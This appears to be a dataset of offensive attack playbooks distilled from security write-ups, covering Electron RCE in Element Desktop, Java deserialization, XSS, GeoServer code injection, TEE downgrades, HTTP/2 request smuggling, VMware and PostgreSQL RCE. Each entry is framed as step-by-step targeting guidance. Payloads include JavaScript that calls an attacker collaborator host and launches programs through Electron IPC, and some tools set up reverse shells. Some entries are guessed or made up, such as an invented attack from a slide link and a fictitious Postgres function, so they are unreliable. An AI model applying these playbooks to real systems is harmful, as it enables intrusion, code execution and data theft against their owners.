meta.title: Remote Code Execution on Element Desktop Application using Node Integration in Sub Frames Bypass - CVE-2022-23597

trigger_conditions.when_to_apply: When the Element Desktop application allows embedding external content in iframes, specifically through the jitsi.html functionality, and when the application is using an older version of Electron that might have insecure defaults or behaviors related to nodeIntegrationInSubFrames.
prerequisites: Attacker can control the `conferenceDomain` parameter in `app.element.io/jitsi.html` to point to an attacker-controlled domain.
applicability_signals: The presence of `app.element.io/jitsi.html?conferenceDomain=<attacker_domain>` endpoint.
The target's Electron version is older than what has fixed the `nodeIntegrationInSubFrames` vulnerability.
The `User-Agent` string indicates the application is an Electron-based desktop app.
skip_if: The `nodeIntegrationInSubFrames` web preference is explicitly disabled and a newer Electron version is used.
The application is not using Electron or is not the Element desktop application.

recon_steps: Step 1: Identify if the target Element Desktop application uses external iframes by checking for functionalities like Jitsi integration and observing the `conferenceDomain` parameter.

Step 2: Check the `User-Agent` header of the Element Desktop application to confirm it is built with Electron and identify the version. Look for `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Element/<version> Chrome/<chrome_version> Electron/<electron_version> Safari/537.36`.
attack_steps: Step 1: Craft a URL that leverages the Jitsi integration to load an attacker-controlled domain: `https://app.element.io/jitsi.html?conferenceDomain=<ATTACKER_CONTROLLED_DOMAIN>&conferenceId=xxd&userId=pew`.

Step 2: Host a malicious webpage on the `<ATTACKER_CONTROLLED_DOMAIN>` that exploits the `nodeIntegrationInSubFrames` vulnerability in older Electron versions to gain access to the `electron.send` API.

Step 3: In the malicious webpage, send an IPC message to the main frame using `electron.send` to trigger the `userDownloadOpen` handler with a malicious path: `electron.send('userDownloadOpen', { path: 'C:\Windows\System32\calc.exe' })`.
payloads_or_patterns: var request = new XMLHttpRequest(); request.open('POST', 'http://<YOUR_COLLABORATOR_URL>/log', true); request.send();

if (window.electronApi) { window.electronApi.send('userDownloadOpen', { path: 'calc.exe' }); } else if (window.require) { const remote = window.require('electron').remote; remote.shell.openPath('calc.exe'); }
tools_recommended: Burp Suite: To host the attacker-controlled domain and log incoming requests.
A simple HTTP server: To serve the malicious JavaScript payload.
success_indicators: Execution of the payload, e.g., calculator application opens on the victim's machine.
Network traffic logged on the attacker's server indicating the IPC message was sent.
Arbitrary file path opening, such as `shell.openPath('C:\Windows\System32\calc.exe')`.
failure_indicators: The iframe loads but no JavaScript execution occurs on the malicious domain.
The `electron.send` function is not available in the iframe context.
The `userDownloadOpen` IPC handler is not exposed or is handled securely.
The Element application returns an error or fails to load the iframe content.

playbooks.impact: Remote Code Execution on the victim's machine, allowing an attacker to execute arbitrary commands, access sensitive files, and compromise the system.
playbooks.key_lesson: When targeting Electron-based desktop applications, always investigate iframe injection vulnerabilities and the `nodeIntegrationInSubFrames` web preference, especially on older application versions, as it can lead to RCE by bypassing sandbox restrictions and accessing inter-process communication (IPC) handlers.

meta.title: Video PoC

trigger_conditions.when_to_apply: When an authenticated user can upload and view videos within the Element client.
prerequisites: User account on a Matrix homeserver and Element client.
applicability_signals: Ability to upload and view video files.
skip_if: Video playback is heavily sandboxed and does not render arbitrary HTML/JS.

recon_steps: Step 1: Identify the video upload functionality within the Element client.
Step 2: Confirm that uploaded videos are displayed within the chat interface.
attack_steps: Step 1: Craft a malicious MP4 file containing an XSS payload.
Step 2: Upload the crafted MP4 file to a Matrix room using the Element client.
Step 3: Attempt to view the uploaded video by clicking on it in the chat interface.
payloads_or_patterns: Insufficient detail in writeup. The writeup mentions 'malicious MP4 file' but does not provide specifics on payload construction or encoding.
tools_recommended: Insufficient detail in writeup. No specific tools are mentioned, but tools for crafting malicious media files (e.g., ffmpeg with specific filters) might be relevant.
success_indicators: Insufficient detail in writeup. The writeup mentions 'triggering an XSS attack' but does not detail what the observable outcome would be (e.g., alert box, redirected to a malicious site, cookie theft).
failure_indicators: Insufficient detail in writeup. The writeup implies a successful exploit but does not describe what a failed attempt looks like.

playbooks.impact: Cross-site scripting (XSS) vulnerability allowing an attacker to execute arbitrary JavaScript in the victim's browser, potentially leading to session hijacking, data theft, or redirection to malicious sites.
playbooks.key_lesson: When testing media upload features, investigate if crafted media files can embed and execute XSS payloads within the preview or playback mechanism.

meta.title: How I earned a $7000 bug bounty from Grab (RCE Unique Bugs)

tech_stack_fingerprints: Presence of Jackson library in Android application's dependencies

trigger_conditions.when_to_apply: When a mobile application utilizes the Jackson library for JSON deserialization and the application allows for the creation of arbitrary objects within the JSON payload, exposing class names.
prerequisites: The target application must use the Jackson data-binding library in its Java backend or Android application.
The application must be susceptible to deserialization vulnerabilities.
applicability_signals: JSON payloads that include a "@class" field specifying a Java class name.
Use of Jackson's `enableDefaultTyping()` or similar configurations that allow for class name information within JSON.
skip_if: The Jackson library is not in use.
Jackson is configured with `disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)` and does not allow dynamic class instantiation.
The application performs strict validation on all incoming JSON payloads and rejects any with unexpected fields like `@class`.

recon_steps: Step 1: Use mobile security analysis tools like BeVigil or MobSF to identify if the target Android application includes the Jackson library in its dependencies.

Step 2: Analyze the application's network traffic (using Burp Suite or similar proxy) to observe JSON payloads being sent and received. Look for patterns that indicate object creation or custom serialization.
attack_steps: Step 1: Craft a malicious JSON payload that includes a "@class" field pointing to a known Jackson gadget chain payload (e.g., Apache Commons Collections, Spring)
Step 2: Send the crafted JSON payload to an endpoint that deserializes user-supplied JSON data.
Step 3: Observe the server's response for signs of code execution or unusual behavior.
tools_recommended: BeVigil: For initial mobile app security analysis and dependency identification.
Burp Suite: To intercept, analyze, and modify HTTP requests, especially JSON payloads.
JADX: To decompile Android applications and analyze Java code for Jackson usage and potential deserialization points.
ysoserial: To generate common Java deserialization payloads.
success_indicators: Server-side code execution (e.g., unexpected outbound network connections from the server, creation of files, execution of commands).
Application crash or abnormal termination.
Receipt of a callback on an attacker-controlled server (e.g., Burp Collaborator, a custom listener).
failure_indicators: HTTP 400 Bad Request or 422 Unprocessable Entity responses indicating malformed JSON.
HTTP 500 Internal Server Error without any observable code execution.
No changes in server behavior or network activity. This might indicate that the Jackson configuration is safe or that the specific gadget chain is not effective.
Suggestion for pivot: If standard gadget chains fail, attempt to find custom gadget chains specific to the application's dependencies or identify other deserialization vulnerabilities.

playbooks.impact: Remote Code Execution on the server, allowing an attacker to compromise the application, steal sensitive data, or use the server for further attacks.
playbooks.key_lesson: Always analyze JSON deserialization endpoints for the presence of the "@class" field, as it can be an indicator of dangerous deserialization vulnerabilities when coupled with the Jackson library.

meta.title: DOM Cross-Site Scripting Via postMessage in AnnounceKit

tech_stack_fingerprints: The writeup does not contain specific fingerprints for AnnounceKit's tech stack. It focuses on the vulnerability mechanism.

trigger_conditions.when_to_apply: This vulnerability is applicable when a web application uses `window.postMessage` to communicate between windows or iframes, and fails to properly validate the origin of the incoming messages.
prerequisites: The target application must utilize `window.postMessage` for inter-window communication.
The sender of the `postMessage` event must be controllable by the attacker or the attacker must be able to inject content that triggers such a message.
applicability_signals: Presence of `window.postMessage` calls in the application's JavaScript code.
A scenario where a parent window or an iframe sends messages to another window/iframe, especially if user-controlled data is involved in the message content or the target window's handler.
skip_if: All `postMessage` listeners have strict origin checks that prevent malicious origins.
There are no opportunities to inject content that can trigger `postMessage` events.

recon_steps: Step 1: Analyze JavaScript code for occurrences of `window.postMessage` and its corresponding listeners.
Step 2: Identify which domains or origins are expected by the `postMessage` listeners. Look for cases where the `targetOrigin` parameter is set to '*' or a domain that can be spoofed.
attack_steps: Step 1: Craft an HTML page that will send a `postMessage` event to the vulnerable AnnounceKit domain.
Step 2: The `postMessage` payload should contain a malicious script that will be executed in the context of the AnnounceKit application.
Step 3: Host the crafted HTML page on a controlled server.
Step 4: Trick a user into visiting the crafted HTML page while they are logged into AnnounceKit, or ensure the `postMessage` can be triggered by an unauthenticated user interacting with a component.
tools_recommended: Burp Suite: To intercept and analyze network traffic, identify `postMessage` usage, and craft malicious payloads.
Browser Developer Tools: For inspecting JavaScript code, debugging `postMessage` events, and observing DOM manipulation.
success_indicators: Execution of arbitrary JavaScript code in the context of the AnnounceKit application (e.g., `alert(document.domain)` pops up).
Observable changes in the DOM or application state that are a result of the injected script.
failure_indicators: No JavaScript execution (e.g., `alert` does not pop up). This could indicate proper origin validation or that the payload is not being processed as expected. Pivot to analyzing the exact data structure expected by `postMessage`.

playbooks.impact: An attacker can execute arbitrary JavaScript code in the victim's browser within the context of the AnnounceKit domain. This can lead to session hijacking, stealing sensitive user data, performing actions on behalf of the user, or defacing the application.
playbooks.key_lesson: Always validate the `targetOrigin` in `window.postMessage` calls to prevent cross-origin attacks. Never trust messages from untrusted origins or use '*' as the target origin for sensitive operations.

meta.title: Exploiting CVE-2022-24816: A Code Injection In The Jt-jiffle Extension Of Geoserver

trigger_conditions.when_to_apply: When the target is running an outdated version of GeoServer (specifically 2.17.2) which has the jt-jiffle extension enabled, and the environment does not block requests to the Jiffle script processing endpoints.
prerequisites: The jt-jiffle extension must be installed and enabled in GeoServer.
The target server must be accessible over the network.
applicability_signals: GeoServer is detected running version 2.17.2 or an earlier vulnerable version.
Endpoints related to Jiffle script processing are reachable.
skip_if: GeoServer is running a patched version.
A Web Application Firewall (WAF) is actively blocking requests containing Jiffle script syntax or Java code snippets.

recon_steps: Step 1: Fingerprint the GeoServer version by examining HTTP responses for headers or content indicating the version, or by checking default pages like /geoserver/web.
Step 2: Confirm the presence and functionality of the Jiffle extension by attempting to submit a simple, non-malicious Jiffle script and observing the response.
attack_steps: Step 1: Craft a Jiffle script that includes malicious Java code intended for execution. This script should leverage the Jiffle parsing and compilation process.

Step 2: Send a POST request to the appropriate GeoServer endpoint that processes Jiffle scripts. The exact endpoint may vary, but often involves WFS requests or similar data processing functionalities where Jiffle scripts can be injected.
Step 3: Monitor for external callbacks or observe changes in the target system that indicate successful code execution.
tools_recommended: Burp Suite: To intercept, modify, and replay HTTP requests. Use Intruder to fuzz parameters if needed.
Netcat (nc): To set up a listener for reverse shell callbacks.
Custom script: To automate the generation and submission of Jiffle scripts with various payloads.
success_indicators: Receiving a reverse shell connection from the target server on the specified attacker IP and port.
Observing the output of the executed command on the attacker's machine (e.g., successful `whoami` or `ls` output).
Any unexpected behavior or error messages that suggest the injected code was processed, even if not a full shell.
failure_indicators: Receiving standard error messages from GeoServer indicating a Jiffle parsing error (e.g., 'Jiffle syntax error').
HTTP 4xx or 5xx errors that do not suggest code execution.
No reverse shell callback or observable changes on the target system after multiple attempts.
If a WAF blocks the request with a 403 Forbidden.

playbooks.impact: Unauthenticated Remote Code Execution (RCE) on the GeoServer instance. This allows an attacker to run arbitrary commands on the server, potentially leading to full system compromise, data exfiltration, or further network pivoting.
playbooks.key_lesson: Always verify GeoServer versions and ensure extensions like jt-jiffle are updated to mitigate known code injection vulnerabilities leading to RCE.

meta.title: Researching Xiaomi’s TEE to get to Chinese money

target_profile.technology: Xiaomi TEE (Trusted Execution Environment) on MediaTek chips
tech_stack_fingerprints: ELF file format for trusted apps
Xiaomi devices using MediaTek chips with Beanpod TEE or Mitee

trigger_conditions.when_to_apply: Applicable to Xiaomi devices utilizing MediaTek chipsets where trusted applications can be downgraded to older, potentially vulnerable versions.
prerequisites: Attacker must be able to execute an unprivileged Android application on the target device.
The target device must be running a Xiaomi ROM on a MediaTek chipset.
Access to older versions of trusted application binaries (.ta files).
applicability_signals: Trusted app files in /vendor/thh/ta/ are unencrypted binaries.
Trusted app binary format includes an ELF header.
The trusted app file format omits a version control field.
skip_if: Target device uses Qualcomm chips (QSEE TEE instead of Beanpod/Mitee).
TEE enforces strict version checking on trusted application updates.
Trusted application files are encrypted or integrity-checked at runtime.

recon_steps: Step 1: Identify target device as a Xiaomi phone powered by a MediaTek chip.
Step 2: Examine the /vendor/thh/ta/ directory for trusted application binaries (.ta files). Confirm they are unencrypted and follow ELF format.
Step 3: Search for publicly available firmware or system images of older Xiaomi ROMs to extract older versions of trusted applications.
attack_steps: Step 1: Obtain an older, known vulnerable version of a trusted application binary (.ta file).

Step 2: Use the unprivileged Android application to overwrite the existing trusted application file on the device with the older version. This may require elevated permissions or exploiting a privilege escalation vulnerability if direct file overwrite is not permitted.
Step 3: Trigger the functionality of the downgraded trusted application to observe the impact. For example, attempt to forge payment packages or disable the payment system.
payloads_or_patterns: Copy of an older, vulnerable .ta file (e.g., an old thhadmin.ta)
tools_recommended: Android Debug Bridge (ADB) for file transfer and command execution.
Custom Android application to facilitate file overwriting and interaction with the TEE.
Firmware analysis tools (e.g., binwalk) to extract .ta files from firmware images.
success_indicators: Successful loading of the older trusted application binary by the TEE, indicated by the absence of signature errors or version mismatch errors.
Ability to forge payment packages or disable payment functionalities that were previously secured in newer trusted app versions.
Unexpected behavior or responses from the payment system after downgrading the trusted app.
failure_indicators: TEE rejecting the older trusted application due to signature mismatch or an implicit version check.
The Android application crashing or failing to execute due to incompatibility with the older TEE application.
No observable change in payment system behavior, indicating the downgrade was unsuccessful or the exploited vulnerability is not present in the older version.

playbooks.impact: Attacker can bypass security fixes in trusted applications, enabling them to forge payment packages or disable the payment system directly from an unprivileged Android application, leading to financial loss.
playbooks.key_lesson: When researching TEE implementations on mobile devices, always check if trusted applications have version control mechanisms and if older, vulnerable versions can be deployed to bypass security patches.

meta.title: FRAMESHIFTER: Security Implications of HTTP/2-to-HTTP/1 Conversion Anomalies
meta.authors: Bahruz Jabiyev, Steven Sprecher, Anthony Gavazzi, Tommaso Innocenti, Kaan Onarlioglu, Engin Kirda

target_profile.technology: Web servers/proxies performing HTTP/2 to HTTP/1.1 downgrade
tech_stack_fingerprints: Server responses indicating HTTP/2 support (e.g., ALPN in TLS handshake, Upgrade header)
Use of common reverse proxies like Nginx, HAProxy, or cloud load balancers known to perform downgrades

trigger_conditions.when_to_apply: When a target system performs an HTTP/2 to HTTP/1.1 downgrade in its proxy or load balancing layer, and this conversion is not handled strictly, leading to discrepancies in request boundary parsing.
prerequisites: Target supports HTTP/2
Target has a component that downgrades HTTP/2 to HTTP/1.1
applicability_signals: Observed HTTP/2 traffic to the server
Lack of strict adherence to RFC 7230 and RFC 7540 parsing rules during downgrade
Potential for different interpretations of request boundaries by the frontend (HTTP/2) and backend (HTTP/1.1) servers
skip_if: Target exclusively uses HTTP/1.1
The HTTP/2 to HTTP/1.1 downgrade proxy is known to be strictly compliant and sanitize all requests before forwarding

recon_steps: Step 1: Fingerprint the target for HTTP/2 support. Use tools like `curl -I --http2 <TARGET_URL>` or check TLS handshake ALPN extensions.
Step 2: Identify if the target uses a known vulnerable proxy or load balancer that performs HTTP/2 to HTTP/1.1 downgrades. Research known issues with specific software versions.
attack_steps: Step 1: Craft a malicious HTTP/2 request that exploits the downgrade anomaly. This typically involves sending a request with conflicting `Content-Length` and `Transfer-Encoding` headers, or manipulating other header parsing.
Step 2: Send the crafted HTTP/2 request to the target endpoint.

Step 3: Analyze the backend server's response to detect if the smuggled request was processed and if its effects are observable (e.g., by causing an error in the backend, or by affecting a subsequent request made by the client).
payloads_or_patterns: HTTP/2 frame manipulation to create ambiguous request boundaries during downgrade. Example (conceptual, actual frames are complex): Constructing a request where a PRI * GET request is followed by a smuggled POST request, with the downgrade proxy misinterpreting the end of the first request.

Exploiting `Content-Length` and `Transfer-Encoding` discrepancies in the downgraded HTTP/1.1 request. For example, sending a malformed HTTP/2 frame that, when converted to HTTP/1.1, results in a request like: `POST / HTTP/1.1
Host: <TARGET_URL>
Content-Length: 5
Transfer-Encoding: chunked

0

SMUGGLED_PAYLOAD`
tools_recommended: Custom HTTP/2 client that allows fine-grained control over frames (e.g., using libraries like nghttp2 with manual frame construction)
Burp Suite with a custom HTTP client or extensions to craft and send HTTP/2 requests
Network traffic analysis tools (Wireshark) to inspect the raw HTTP/2 and downgraded HTTP/1.1 traffic
success_indicators: The backend server processes a request that was not intended to be part of the initial client request.
Unexpected error messages or status codes originating from the backend server.
Leaked sensitive information from the backend server in the response to a subsequent request.
Successful execution of a denial-of-service condition by causing internal server errors or resource exhaustion.
failure_indicators: All requests result in a 4xx or 5xx error without any discernible impact of a smuggled request.
The server correctly parses HTTP/2 requests without any parsing ambiguities during downgrade.
A WAF or security control blocks the malformed HTTP/2 request before it reaches the downgrade proxy.

playbooks.impact: Allows an attacker to bypass security controls (WAFs, access control), perform unintended actions on the backend server, gain unauthorized access to data, or cause denial-of-service conditions. The smuggled request can target the backend server directly, bypassing frontend protections.
playbooks.key_lesson: When analyzing systems that use HTTP/2, pay close attention to how HTTP/2 to HTTP/1.1 downgrades are handled, as discrepancies in request parsing can lead to HTTP request smuggling vulnerabilities.

meta.title: Biological Inspiration: HTTP/2-to-HTTP/1 Conversion Anomalies

target_profile.technology: HTTP/2 reverse proxies and CDN servers

trigger_conditions.when_to_apply: When a reverse proxy or CDN server performs HTTP/2 to HTTP/1 conversion and exhibits abnormal conversion behavior when presented with malformed HTTP/2 frames.
prerequisites: Target server must support HTTP/2 protocol.
applicability_signals: Reverse proxy or CDN infrastructure handling HTTP/2 traffic.
Vulnerability is known to affect specific implementations (e.g., Golang, Apache Traffic Server, and others mentioned in the writeup).
skip_if: Target server strictly enforces HTTP/2 protocol and does not perform HTTP/1 downgrade.
Target server has been patched against the described conversion anomalies.

recon_steps: Step 1: Fingerprint the target for HTTP/2 support by sending an HTTP/2 preface.
Step 2: Identify if the target is a reverse proxy or CDN by observing response headers or IP reputation.
attack_steps: Step 1: Use the Frameshifter tool (or similar) to generate malformed HTTP/2 frames designed to trigger abnormal HTTP/1 conversion.
Step 2: Send the generated frames to the target endpoint.
Step 3: Analyze the responses and backend behavior for indicators of HTTP request smuggling or denial of service.
Step 4: Specifically look for anomalies that lead to request blackholing or query-of-death scenarios.
payloads_or_patterns: N/A - The attack involves generating custom HTTP/2 frames using tools like Frameshifter, rather than a static payload string.
tools_recommended: Frameshifter: For generating malformed HTTP/2 frames based on biological frameshift mutation principles.
success_indicators: Backend server exhibits unexpected behavior (e.g., denial of service, malformed requests reaching the backend).
Specific attack outcomes like 'Query-of-Death' or 'Request Blackholing' are confirmed.
CVEs are assigned to the affected vendors, indicating confirmed vulnerabilities.
failure_indicators: Target gracefully handles malformed HTTP/2 frames without abnormal conversion.
No observable changes in backend behavior or responses.
WAF blocks the malformed frames.

playbooks.impact: Potential for denial of service (DoS) by blackholing requests or triggering exploitable states like the 'Query-of-Death' attack. This can render services unavailable and potentially expose backend systems to further attacks if request smuggling is also achieved.
playbooks.key_lesson: When targeting reverse proxies or CDNs, always investigate their HTTP/2 to HTTP/1 conversion logic for anomalies by fuzzing with malformed frames, drawing inspiration from concepts like biological frameshift mutations.

meta.title: IAM Whoever I Say IAM :: Infiltrating VMWare Workspace ONE Access Using a 0-Click Exploit

trigger_conditions.when_to_apply: When a VMware Workspace ONE Access appliance is deployed and accessible externally, especially if it's running version 21.08.0.1, as it presents a minimal pre-authenticated attack surface.
prerequisites: Target is running VMware Workspace ONE Access version 21.08.0.1 or similar vulnerable versions.
applicability_signals: The presence of the VMware Workspace ONE Access login page without any prior authentication requirements for certain functionalities.
The use of SAML and OAuth 2.0 protocols as part of the authentication flow.
skip_if: If the target is not VMware Workspace ONE Access.
If the target environment has undergone security hardening and patched against known RCE vulnerabilities.
If Spring's StrictHttpFirewall is configured to block common filter bypass techniques that might be part of an exploit chain.

recon_steps: Step 1: Identify the target as VMware Workspace ONE Access by checking for known identifiers or default paths.
Step 2: Determine the specific version of VMware Workspace ONE Access being used (e.g., 21.08.0.1) by examining server headers, footer information, or error messages.
Step 3: Probe for pre-authenticated endpoints that are exposed before the SAML/OAuth 2.0 authentication flows initiate.
attack_steps: Step 1: The writeup describes chaining multiple vulnerabilities (CVE-2020-4006 and others) to achieve RCE. Specific steps for the *pre-authenticated* RCE chain (nicknamed Hekate) are not fully detailed but imply exploiting a flaw in the IAM solution itself before any user authentication.

Step 2: The writeup mentions a post-authenticated command injection (CVE-2020-4006) and an SSRF vulnerability that could leak JWT tokens. The pre-authenticated RCE likely leverages a different, undisclosed vulnerability in the IAM component.
Step 3: The ultimate goal is to achieve remote root access by exploiting this chain.
tools_recommended: Burp Suite or similar proxy for intercepting and analyzing traffic.
Custom scripts for fuzzing and testing specific API endpoints related to IAM functionalities.
Vulnerability scanners focused on web applications and authentication mechanisms.
success_indicators: Execution of arbitrary commands on the target server.
Gaining a reverse shell on the server.
Achieving root-level privileges on the compromised appliance.
Successful exploitation of the described 'Hekate' exploit chain.
failure_indicators: Receiving standard authentication prompts without any visible vulnerabilities.
Error messages indicating patched vulnerabilities or unexpected behavior.
WAF blocking attempts or returning generic error codes.
Inability to trigger the described exploit chain due to version differences or prior mitigation.

playbooks.impact: Remote code execution as root on the VMware Workspace ONE Access appliance, leading to complete compromise of the identity and access management system, potential exfiltration of sensitive user credentials and session tokens, and lateral movement within the network.
playbooks.key_lesson: Always investigate pre-authenticated attack surfaces on identity and access management solutions, as a compromise here can grant full control over the authentication infrastructure.

meta.title: Hekate exploits
meta.authors: Steven Seeley of Qihoo 360 Vulnerability Research Institute

trigger_conditions.when_to_apply: When the VMware Workspace ONE Access appliance is running a default configuration, especially version 21.08.0.1.
prerequisites: The target VMware Workspace ONE Access appliance must be accessible over the network.
applicability_signals: The presence of vulnerable JDBC drivers (MySQL or PostgreSQL) and the specific Java deserialization gadgets or licensecheck-1.1.5.jar library.
skip_if: The appliance is running a patched version or has significantly altered default configurations that disable vulnerable JDBC driver features or Java deserialization.

recon_steps: Step 1: Identify VMware Workspace ONE Access appliances by looking for OVF files or specific version banners if available.
Step 2: Confirm the version is 21.08.0.1 or a known vulnerable prior version.
Step 3: Inspect network services and banners for indications of Java-based applications.
attack_steps: Step 1: Set up a rogue MySQL server with a malicious JDBC driver that leverages auto-deserialization.

Step 2: Configure the target appliance to connect to the rogue MySQL server (details vary based on exploit technique - e.g., manipulating configuration files or using specific API calls if available).
Step 3: For the PostgreSQL technique, use a crafted link or payload to trigger the `socketFactory` in the PostgreSQL JDBC Driver. Optionally, use `licensecheck-1.1.5.jar` to trigger deserialization.
Step 4: If a victim operator is targeted, send a specially crafted link to initiate RCE via social engineering.
tools_recommended: Burp Suite: To intercept and modify requests, and potentially host malicious payloads.
Custom scripts: For setting up rogue servers and crafting specific exploit payloads.
success_indicators: Execution of commands on the vIDM appliance as the 'root' user.
Receipt of callbacks from the target appliance to an attacker-controlled server.
Confirmation of arbitrary file read/write or command execution through logs or interactive shell.
failure_indicators: Connection refused or timeout to the rogue server: Indicates network misconfiguration or blocking.
No callbacks or command execution: Suggests the vulnerability is not present or exploitation failed. Pivot to other techniques or check for WAF blocks.

playbooks.impact: Remote code execution as root on the VMware Workspace ONE Access appliance, allowing complete compromise of the system and potentially sensitive data access and further lateral movement within the network.
playbooks.key_lesson: Always investigate default configurations of enterprise appliances, especially those involving Java deserialization or JDBC driver functionalities, as they can lead to unauthenticated RCE.

meta.title: Slides

trigger_conditions.when_to_apply: This technique is applicable when the target application serves sensitive files or data without proper access controls, allowing unauthenticated access.
prerequisites: The target application must be accessible over HTTP/S.
applicability_signals: The application hosts downloadable files, particularly documents or archives, that might contain sensitive information. The presence of files with extensions like .pdf, .zip, or .conf that are publicly accessible.
skip_if: All files hosted by the application require authentication or return access denied for unauthenticated users.

recon_steps: Step 1: Examine the application's public-facing endpoints and directories for any downloadable files.
Step 2: Attempt to download common sensitive file types (e.g., PDFs, configuration files, archives) without authentication to identify publicly exposed data.
attack_steps: Step 1: Attempt to directly access known or discovered file paths on the server (e.g., <TARGET_URL>/slides/README.md).
Step 2: If a file is successfully downloaded, inspect its content for sensitive information like API keys, credentials, internal network details, or PII.
Step 3: If the application provides a directory listing or allows for predictable file naming, attempt to enumerate and download other potentially sensitive files.
tools_recommended: Burp Suite Intruder: To enumerate common file names and extensions.
Nikto: For web server scanning and identification of vulnerable files or misconfigurations.
Curl: For direct file downloads.
success_indicators: Successful download of files containing sensitive information (e.g., credentials, internal configuration, PII).
Response code 200 OK for sensitive file paths.
failure_indicators: 404 Not Found or 403 Forbidden responses for all attempted file paths. This indicates that either the files are not present or access controls are effectively preventing access.

playbooks.impact: Exposure of sensitive information such as credentials, internal configuration details, or personally identifiable information (PII), which could lead to further system compromise.
playbooks.key_lesson: Always check for publicly accessible sensitive files, especially configuration files, documentation, and backups, as they may contain exploitable information due to insecure default configurations.

meta.title: The cloud has an isolation problem: PostgreSQL vulnerabilities affect multiple cloud vendors
meta.programs: Google Cloud Platform, Microsoft Azure, Aiven
meta.authors: Ronen Shustin, Shir Tamari, Nir Ohfeld, Sagi Tzadik

trigger_conditions.when_to_apply: When a cloud provider offers a managed PostgreSQL service and has introduced custom modifications to the PostgreSQL codebase to manage multi-tenancy and restrict user capabilities.
prerequisites: Attacker has an authenticated user account within the cloud provider's environment for the affected PostgreSQL service.
applicability_signals: The managed PostgreSQL service allows creation of event triggers.
The managed PostgreSQL service allows loading extensions.
The managed PostgreSQL service allows managing replications.
Custom configurations or modifications are present in the managed PostgreSQL instance.
skip_if: The managed PostgreSQL service strictly enforces file system access restrictions without any apparent bypass mechanisms.
No custom modifications or extensions are identifiable in the PostgreSQL service.

recon_steps: Step 1: Identify the PostgreSQL version and any custom configurations or extensions used by the managed service provider.
Step 2: Review vendor documentation for allowed PostgreSQL functionalities and restrictions, particularly around file system access and command execution.
attack_steps: Step 1: Attempt to create an event trigger with a malicious payload targeting the PostgreSQL server's underlying operating system. The exact payload will depend on the specific modifications made by the cloud vendor. This could involve leveraging custom functions or extensions.

Step 2: If event triggers are insufficient, explore the possibility of loading custom extensions that might expose OS command execution capabilities. This is highly dependent on the provider's allowed extension management.
Step 3: If successful in executing commands, pivot to accessing sensitive data or other tenant's data if cross-tenant isolation is also compromised.
payloads_or_patterns: Example for command execution via event trigger (conceptual, requires specific vendor context): CREATE EVENT TRIGGER trigger_name ON ddl_command_end WHEN TAG IN ('CREATE TABLE') EXECUTE FUNCTION exec_command('ls /');
Exploiting vendor-specific functions or extensions designed for management that might have vulnerabilities allowing command injection.
tools_recommended: psql client for interacting with PostgreSQL.
Burp Suite or similar proxy to capture and modify requests.
Custom scripts for automating payload generation and testing.
success_indicators: Execution of arbitrary commands on the vendor-managed compute instance, observed via side channels or through interactions with controlled external systems (e.g., receiving data at a collaborator server).
Unauthorized access to other tenants' databases or sensitive information.
failure_indicators: Received errors indicating that event trigger creation or extension loading is not permitted, or that the executed commands are blocked by security controls. Suggestion: Investigate other potential vulnerabilities like SQL injection or insecure direct object references if command injection is not feasible.

playbooks.impact: Gaining an initial foothold within cloud provider internal networks, leading to potential execution of arbitrary commands on vendor-managed compute instances. In extreme cases, this can be leveraged for unauthorized cross-tenant data access.
playbooks.key_lesson: Managed PostgreSQL services can introduce vulnerabilities through custom modifications to the open-source codebase; always investigate how cloud providers adapt legacy software for multi-tenancy and look for opportunities to exploit these adaptations for command execution or privilege escalation.

meta.title: Attacking Titan M with Only One Byte

trigger_conditions.when_to_apply: This technique is applicable when a security chip like Titan M, running firmware based on EC OS with a static memory layout and stack canaries but no other advanced exploit mitigations, is accessible for fuzzing.
prerequisites: Ability to fuzz the Titan M firmware, either via black-box or emulation-based methods.
Knowledge of the inter-task communication protocol (Protobuf).
applicability_signals: Target is a security chip (Titan M).
Firmware based on EC OS.
Static memory layout.
Stack canary present.
Absence of heap allocation.
skip_if: Target utilizes advanced exploit mitigations like ASLR, DEP, or advanced heap protection.
No observable crash or unexpected state detection mechanism available.

recon_steps: Step 1: Identify the target as the Titan M security chip, running Embedded Controller (EC) OS.
Step 2: Analyze firmware structure, noting the absence of heap and presence of stack canaries.
Step 3: Identify communication protocols used by the chip (Protobuf mentioned).
attack_steps: Step 1: Utilize emulation-based fuzzing (e.g., AFL++ in Unicorn mode) to fuzz the Titan M firmware.
Step 2: Generate mutated Protobuf messages to send to the chip.
Step 3: Observe for crashes or unexpected states indicative of memory corruption.
Step 4: Analyze memory corruption to identify exploitable vulnerabilities (CVE-2022-20233 mentioned).
Step 5: Craft a specific payload to exploit the identified vulnerability (e.g., overwriting a specific byte to hijack execution flow).
Step 6: Leverage the UART console for debugging and observing execution flow.
Step 7: Implement Return-Oriented Programming (ROP) to achieve arbitrary code execution.
payloads_or_patterns: Mutated Protobuf messages targeting inter-task communication.
Specific byte overwrite payload targeting a known vulnerable location.
tools_recommended: AFL++ with Unicorn mode for emulation-based fuzzing.
libprotobuf-mutator for Protobuf message mutation.
Custom client (nosclient mentioned) for interacting with the kernel driver.
Debugger/UART console for observing execution flow.
success_indicators: Observed crash or unexpected state in the emulated Titan M.
Successful hijacking of execution flow.
Achieved code execution on the Titan M chip.
failure_indicators: Fuzzing produces no crashes or interesting behavior (suggesting a need for better mutators or different fuzzing targets).
Identified memory corruption does not lead to exploitable state (suggesting need for more sophisticated exploitation techniques or deeper vulnerability analysis).
UART console shows no signs of execution flow hijacking or code execution.

playbooks.impact: Obtained code execution on the Titan M security chip, potentially allowing an attacker to compromise sensitive operations handled by the chip such as secure boot, hardware-backed Keystore, or other security-critical functions.
playbooks.key_lesson: When targeting embedded security chips with static memory layouts, focus on fuzzing communication interfaces with mutated protocol messages and leverage emulation for deep code analysis to find memory corruption vulnerabilities.

meta.title: Identity Confusion in WebView-based Mobile App-in-app Ecosystems
meta.authors: Lei Zhang, Zhibo Zhang, Ancong Liu, Yinzhi Cao, Xiaohan Zhang, Yanjun Chen, Yuan Zhang, Guangliang Yang, Min Yang

tech_stack_fingerprints: Mobile applications utilizing WebView for sub-app functionality

trigger_conditions.when_to_apply: When a mobile application (super-app) delegates functions to other parties (sub-apps) via WebViews, and these sub-apps have access to privileged APIs provided by the super-app.
prerequisites: The target application must be a 'super-app' hosting 'sub-apps' within WebViews.
Sub-apps must have access to privileged APIs of the super-app.
applicability_signals: The presence of WebView components that load external or third-party content.
